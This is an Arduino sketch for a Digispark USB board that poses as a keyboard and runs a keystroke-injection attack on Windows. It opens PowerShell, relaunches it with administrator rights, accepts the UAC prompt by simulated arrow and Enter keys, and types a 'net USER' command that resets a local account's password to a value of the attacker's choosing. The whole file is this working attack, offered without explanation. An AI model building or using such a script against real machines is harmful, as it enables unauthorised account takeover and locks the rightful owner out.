#include "DigiKeyboard.h"

void setup() {
 
}
  
void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay (500);
  DigiKeyboard.print ("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay (1000);
  DigiKeyboard.print ("Start-Process powershell -verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay (1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("net USER <user_account_name> <new_password>");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay (1000);
  DigiKeyboard.print ("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay (1000);
  DigiKeyboard.print ("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay (1000);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay (2000);
   while (1) {
   }
}
